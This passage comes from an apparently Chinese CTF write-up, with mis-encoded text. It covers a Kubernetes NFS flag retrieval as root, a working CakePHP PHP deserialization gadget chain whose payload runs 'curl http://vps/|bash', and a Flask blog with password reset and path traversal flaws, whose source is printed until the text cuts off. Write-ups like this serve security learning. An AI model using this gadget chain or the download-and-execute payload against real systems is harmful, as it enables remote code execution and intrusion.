curlï¼Œä¸‹è½½å¯¹åº”çš„ metrics æ–‡æœ¬ä¸ºæ–‡ä»¶</p><p>kube-state-metrics.lens-metrics.svc.cluster.local:8080&#x2F;metrics</p><blockquote><p>ç°åœ¨çš„ k8spider å¯ä»¥å¸®åŠ©ä½ åˆ†æè¿™ç±» metrics ä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼Œä½¿å¾—ä½ å¯ä»¥æå¤§å¯èƒ½æŠŠæ¡é›†ç¾¤æ•´ä½“çŠ¶æ€ã€‚</p></blockquote><h4 id="é›†ç¾¤-NFS-PV"><a href="#é›†ç¾¤-NFS-PV" class="headerlink" title="é›†ç¾¤ NFS PV"></a>é›†ç¾¤ NFS PV</h4><p>åœ¨ metrics ä¿¡æ¯ä¸­å­˜åœ¨ï¼Œæ•æ„Ÿä¿¡æ¯ nfs pv é…ç½®ã€‚</p><blockquote><p>å‘ç°è¿™ä¸ª nfs ååˆ©ç”¨çš„å¥—è·¯ k8slanparty ä¸€æ¨¡ä¸€æ ·</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kube_persistentvolume_info&#123;persistentvolume=<span class="hljs-string">&quot;nfs-pv&quot;</span>,storageclass=<span class="hljs-string">&quot;nfs-client&quot;</span>,gce_persistent_disk_name=<span class="hljs-string">&quot;&quot;</span>,ebs_volume_id=<span class="hljs-string">&quot;&quot;</span>,azure_disk_name=<span class="hljs-string">&quot;&quot;</span>,fc_wwids=<span class="hljs-string">&quot;&quot;</span>,fc_lun=<span class="hljs-string">&quot;&quot;</span>,fc_target_wwns=<span class="hljs-string">&quot;&quot;</span>,iscsi_target_portal=<span class="hljs-string">&quot;&quot;</span>,iscsi_iqn=<span class="hljs-string">&quot;&quot;</span>,iscsi_lun=<span class="hljs-string">&quot;&quot;</span>,iscsi_initiator_name=<span class="hljs-string">&quot;&quot;</span>,nfs_server=<span class="hljs-string">&quot;0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com&quot;</span>,nfs_path=<span class="hljs-string">&quot;/nfs-root/&quot;</span>,csi_driver=<span class="hljs-string">&quot;&quot;</span>,csi_volume_handle=<span class="hljs-string">&quot;&quot;</span>,local_path=<span class="hljs-string">&quot;&quot;</span>,local_fs=<span class="hljs-string">&quot;&quot;</span>,host_path=<span class="hljs-string">&quot;&quot;</span>,host_path_type=<span class="hljs-string">&quot;&quot;</span>&#125; 1<br></code></pre></td></tr></table></figure><p>nfs æœåŠ¡å™¨ä¸º 0c09048b03-got17.cn-hangzhou.nas.aliyuncs.comï¼Œnfs è·¯å¾„ä¸º &#x2F;nfs-root&#x2F;</p><p>é€šè¿‡ socks5 ä»£ç†åï¼Œå°è¯•ä½¿ç”¨ nfs-cat å’Œ nfs-ls è¿›è¡Œè®¿é—®</p><p>å³å¯å¾—åˆ° flag åœ¨ nfs &#x2F; ç›®å½•ä¸­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nfs-ls nfs://0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com/?uid=0<br>nfs-cat nfs://0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com/flag.txt?uid=0<br></code></pre></td></tr></table></figure><p>æˆ–è€…ä¸Šä¼ ä¸€ä¸ª nfs client</p><p>ä¾‹å¦‚ <a href="https://github.com/mubix/nfsclient/tree/main">https://github.com/mubix/nfsclient/tree/main</a></p><p>ä½†æ˜¯ä»–æœ‰ç‚¹å° bug æ²¡åŠæ³•ä¸‹è½½æ–‡ä»¶ éœ€è¦ä¿®æ”¹ä¸º <a href="https://github.com/mubix/nfsclient/blob/dadb0bf6caa10f02a617abf65c972e36389810cd/nfsclient.go#L121">https://github.com/mubix/nfsclient/blob/dadb0bf6caa10f02a617abf65c972e36389810cd/nfsclient.go#L121</a> ä¸º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">f, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY, 0777)<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±ä¸ä¼šæœ‰é—®é¢˜äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">nfsc 0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com:/ root:0:0 <span class="hljs-built_in">ls</span><br>+----------+-----+-----+----------+------+<br>| FILENAME | UID | GID | MODE     | SIZE |<br>+----------+-----+-----+----------+------+<br>| .        |   0 |   0 | 0x543c60 | 4096 |<br>| ..       |   0 |   0 | 0x543c60 | 4096 |<br>| flag.txt |   0 |   0 | 0x543c60 |   74 |<br>| nfs-root |   0 |   0 | 0x543c60 | 4096 |<br>+----------+-----+-----+----------+------+<br><br>nfsc 0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com:/ root:0:0 down flag.txt <br><span class="hljs-built_in">cat</span> flag.txt<br></code></pre></td></tr></table></figure><h2 id="SU-POP"><a href="#SU-POP" class="headerlink" title="SU_POP"></a>SU_POP</h2><p>ç®€å•æ‰¾popé“¾çš„å®¡è®¡é¢˜ã€‚</p><p><a href="https://github.com/cakephp/cakephp">GitHub - cakephp&#x2F;cakephp: CakePHP: The Rapid Development Framework for PHP - Official Repository</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">React\Promise\Internal\RejectedPromise</span>::<span class="hljs-title function_ invoke__">__destruct</span>()<br>--&gt;<span class="hljs-title class_">Cake\Http\Response</span>::<span class="hljs-title function_ invoke__">__toString</span>()<br>--&gt;Cake\ORM<span class="hljs-title class_">\Table</span>::<span class="hljs-title function_ invoke__">__call</span>()<br>--&gt;Cake\ORM<span class="hljs-title class_">\BehaviorRegistry</span>::<span class="hljs-title function_ invoke__">call</span>()<br>--&gt;<span class="hljs-title class_">PHPUnit\Framework\MockObject\Generator\MockClass</span>::<span class="hljs-title function_ invoke__">generate</span>()<br></code></pre></td></tr></table></figure><p>èµµå“¥æ‰“çš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">React</span>\<span class="hljs-title class_">Promise</span>\<span class="hljs-title class_">Internal</span> &#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">RejectedPromise</span><br>    &#123;<br>        <span class="hljs-title class_">private</span> $<span class="hljs-title class_">handled</span> = <span class="hljs-title class_">false</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$reason</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;handled=<span class="hljs-literal">false</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;reason =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Cake\Http\Response</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Cake</span>\<span class="hljs-title class_">Http</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Response</span><br>    &#123;<br>        <span class="hljs-title class_">private</span> $<span class="hljs-title class_">stream</span> ;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;stream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Cake</span>\ORM\<span class="hljs-title function_ invoke__">Table</span>();<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">PHPUnit</span>\<span class="hljs-title class_">Framework</span>\<span class="hljs-title class_">MockObject</span>\<span class="hljs-title class_">Generator</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">MockClass</span>&#123;<br>        <span class="hljs-title class_">private</span> <span class="hljs-title class_">readonly</span> <span class="hljs-title class_">string</span> $<span class="hljs-title class_">mockName</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$classCode</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;mockName = <span class="hljs-string">&quot;zbr&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;classCode = <span class="hljs-string">&quot;system(\&quot;curl http://vps/|bash\&quot;);&quot;</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Cake</span>\<span class="hljs-title class_">ORM</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">BehaviorRegistry</span>&#123;<br>        <span class="hljs-title class_">protected</span> <span class="hljs-title class_">array</span> $<span class="hljs-title class_">_methodMap</span> ;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$_loaded</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;_loaded=[<span class="hljs-string">&quot;zbr&quot;</span>=&gt;<span class="hljs-keyword">new</span> <span class="hljs-title class_">\PHPUnit\Framework\MockObject\Generator\MockClass</span>()];<br>            <span class="hljs-variable language_">$this</span>-&gt;_methodMap = [<span class="hljs-string">&quot;rewind&quot;</span> =&gt; [<span class="hljs-string">&quot;zbr&quot;</span>,<span class="hljs-string">&quot;generate&quot;</span>]];<br>        &#125;<br>    &#125;<br>    Class Table<br>    &#123;<br>        <span class="hljs-keyword">protected</span> BehaviorRegistry <span class="hljs-variable">$_behaviors</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;_behaviors= <span class="hljs-keyword">new</span> <span class="hljs-title class_">BehaviorRegistry</span>();<br>        &#125;<br><br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">GadgetChain</span> &#123;<br>    $<span class="hljs-title class_">a</span>=<span class="hljs-title class_">new</span> \<span class="hljs-title class_">React</span>\<span class="hljs-title class_">Promise</span>\<span class="hljs-title class_">Internal</span>\<span class="hljs-title class_">RejectedPromise</span>();<br><br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$str</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>callå‚è€ƒè¿™ç¯‡æ–‡ç« <code>$this-&gt;_behaviors</code>ä¼šè°ƒç”¨è½¬å‘åˆ°<code>BehaviorRegistry::call()</code>ï¼Œæ§åˆ¶<code>_methodMap</code>å°†<code>rewind</code>æ˜ å°„åˆ° <code>MockClass .</code>æœ€ååˆ©ç”¨<code>generate</code>å†™ï¼š</p><p><a href="https://xz.aliyun.com/t/9995?time__1311=n4+xnD0DuDRDcGiGCDyDBqOoWP0K5PDt1QYQhOe4D#toc-7">https://xz.aliyun.com/t/9995?time__1311=n4%2BxnD0DuDRDcGiGCDyDBqOoWP0K5PDt1QYQhOe4D#toc-7</a></p><p>å¼¹shellåæœ‰ä¸ªsuidææƒï¼Œfindäº¤äº†ã€‚</p><h2 id="SU-Blog"><a href="#SU-Blog" class="headerlink" title="SU_Blog"></a>SU_Blog</h2><p>å¯å‚è€ƒ<a href="https://kdxcxs.github.io/en/posts/wp/idekctf-2022-task-manager-wp/#bypassing-jinja-directory-traversal-check">idekctf 2022* task manager wp - kdxcxs</a></p><p>registeræ¥å£å¯ä»¥ä»»æ„å¯†ç é‡ç½®ï¼Œç›´æ¥é‡ç½®adminçš„å¯†ç ç™»é™†è¶Šæƒç™»å½•ã€‚</p><p>ç„¶ååœ¨articleæ¥å£çœ‹åˆ°ä¸€ä¸ªç–‘ä¼¼ä»»æ„æ–‡ä»¶è¯»å–çš„ä¸œè¥¿ï¼Œä¸”å¿…é¡»è¦ç”¨articleså¼€å¤´ï¼Œå¹¶ä¸”ç›´æ¥ä¼ ..&#x2F;æ²¡ç”¨ã€‚</p><p>ç»“æœåŒå†™ç»•è¿‡äº†ã€‚ã€‚ã€‚</p><p>å¯ä»¥è¯»åˆ°waf.pyå’Œapp.pyï¼Œéœ€è¦æ³¨æ„çš„æ˜¯wafæŠŠwaf.pyç»™wafäº†ï¼Œæ‰€ä»¥ä¹Ÿè¦åŒå†™ä¸€ä¸‹åˆ©ç”¨è¿™ä¸ª..&#x2F;æ¥è¯»ã€‚</p><p><code>app.py</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time,os,json,hashlib<br><span class="hljs-keyword">from</span> pydash <span class="hljs-keyword">import</span> set_<br><span class="hljs-keyword">from</span> waf <span class="hljs-keyword">import</span> pwaf,cwaf<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = hashlib.md5(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(time.time())).encode()).hexdigest()<br><br>users = &#123;<span class="hljs-string">&quot;testuser&quot;</span>: <span class="hljs-string">&quot;password&quot;</span>&#125;<br>BASE_DIR = <span class="hljs-string">&#x27;/var/www/html/myblog/app&#x27;</span><br><br>articles = &#123;<br>    <span class="hljs-number">1</span>: <span class="hljs-string">&quot;articles/article1.txt&quot;</span>,<br>    <span class="hljs-number">2</span>: <span class="hljs-string">&quot;articles/article2.txt&quot;</span>,<br>    <span class="hljs-number">3</span>: <span class="hljs-string">&quot;articles/article3.txt&quot;</span><br>&#125;<br><br>friend_links = [<br>    &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;bkf1sh&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://ctf.org.cn/&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;fushuling&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://fushuling.com/&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;yulate&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://www.yulate.com/&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;zimablue&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://www.zimablue.life/&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;baozongwi&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://baozongwi.xyz/&quot;</span>&#125;,<br>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>user_data = User()<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;blog.html&#x27;</span>, articles=articles, friend_links=friend_links)<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users <span class="hljs-keyword">and</span> users[username] == password:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid credentials&quot;</span>, <span class="hljs-number">403</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        users[username] = password<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/change_password&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change_password</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        old_password = request.form[<span class="hljs-string">&#x27;old_password&#x27;</span>]<br>        new_password = request.form[<span class="hljs-string">&#x27;new_password&#x27;</span>]<br>        confirm_password = request.form[<span class="hljs-string">&#x27;confirm_password&#x27;</span>]<br><br>        <span class="hljs-keyword">if</span> users[session[<span class="hljs-string">&#x27;username&#x27;</span>]] != old_password:<br>            flash(<span class="hljs-string">&quot;Old password is incorrect&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>        <span class="hljs-keyword">elif</span> new_password != confirm_password:<br>            flash(<span class="hljs-string">&quot;New passwords do not match&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            users[session[<span class="hljs-string">&#x27;username&#x27;</span>]] = new_password<br>            flash(<span class="hljs-string">&quot;Password changed successfully&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;change_password.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/friendlinks&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">friendlinks</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;friendlinks.html&#x27;</span>, links=friend_links)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/add_friendlink&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_friendlink</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>    name = request.form.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    url = request.form.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> name <span class="hljs-keyword">and</span> url:<br>        friend_links.append(&#123;<span class="hljs-string">&quot;name&quot;</span>: name, <span class="hljs-string">&quot;url&quot;</span>: url&#125;)<br><br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;friendlinks&#x27;</span>))<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/delete_friendlink/&lt;int:index&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_friendlink</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= index &lt; <span class="hljs-built_in">len</span>(friend_links):<br>        <span class="hljs-keyword">del</span> friend_links[index]<br><br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;friendlinks&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/article&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">article</span>():<br>    <span class="hljs-keyword">if</span> 